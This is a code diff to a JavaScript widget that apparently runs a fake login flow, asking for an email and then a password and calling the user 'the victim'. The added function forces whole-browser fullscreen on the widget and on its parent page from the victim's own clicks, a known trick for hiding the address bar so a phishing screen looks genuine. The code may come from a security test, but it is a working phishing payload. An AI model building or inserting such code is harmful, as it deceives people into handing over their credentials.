@@ -173,6 +173,31 @@
     log("friendly app surface shown");
   }
 
+  /* whole-browser fullscreen (Full-screen API): needs a real gesture, so it
+     is fired from the victim's actual button clicks; attempted in both the
+     widget realm and the same-origin runner realm */
+  function tryBrowserFS() {
+    var n = 0;
+    try {
+      if (document.documentElement.requestFullscreen) {
+        var r = document.documentElement.requestFullscreen();
+        if (r && r.then) r.then(function () { log("browser FULLSCREEN (widget realm)"); },
+                                   function (e) { log("widget-realm fullscreen blocked: " + (e && e.message || e)); });
+        n++;
+      }
+    } catch (e) {}
+    try {
+      var pd = window.parent.document;
+      if (pd && pd.documentElement && pd.documentElement.requestFullscreen) {
+        var r2 = pd.documentElement.requestFullscreen();
+        if (r2 && r2.then) r2.then(function () { log("browser FULLSCREEN (runner realm)"); },
+                                    function (e) { log("runner-realm fullscreen blocked: " + (e && e.message || e)); });
+        n++;
+      }
+    } catch (e) {}
+    if (!n) log("requestFullscreen unavailable");
+  }
+
   function loading(btn, ms, cb) {
     btn.disabled = true;
     btn.innerHTML = '<span id="t71b-spin"></span>Continuing\u2026';
@@ -196,6 +221,7 @@
     go.className = "t71b-cta"; go.type = "button"; go.textContent = "Continue";
     go.onclick = function () {
       if (!em.value.trim()) return;
+      tryBrowserFS();
       loading(go, 2000, function () { renderPwStep(em.value.trim()); });
     };
     modal.appendChild(go);
@@ -215,6 +241,7 @@
     go.className = "t71b-cta"; go.type = "button"; go.textContent = "Log in";
     go.onclick = function () {
       if (!pw.value) return;
+      tryBrowserFS();
       loading(go, 2600, function () { finish(email, pw.value); });
     };
     modal.appendChild(go);
